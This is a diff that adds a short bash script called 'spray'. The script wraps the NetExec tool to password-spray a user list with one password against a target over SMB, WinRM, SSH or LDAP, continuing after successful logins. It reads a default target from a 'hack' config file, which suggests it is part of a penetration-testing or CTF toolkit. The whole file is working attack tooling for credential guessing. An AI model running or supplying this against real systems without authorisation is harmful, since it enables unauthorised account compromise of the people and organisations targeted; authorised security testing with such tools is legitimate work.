@@ -1,0 +1,6 @@
+#!/usr/bin/env bash
+# spray <userlist> <password> [ip] [proto]   password spray (nxc, default smb)
+u="${1:-}"; pw="${2:-}"; ip="${3:-$(head -1 "$HOME/.config/hack/target" 2>/dev/null)}"; proto="${4:-smb}"
+[ -z "$u" ] || [ -z "$pw" ] && { echo "usage: spray <userlist> <password> [ip] [smb|winrm|ssh|ldap]"; exit 1; }
+[ -z "$ip" ] && { echo "no target/ip"; exit 1; }
+exec nxc "$proto" "$ip" -u "$u" -p "$pw" --continue-on-success
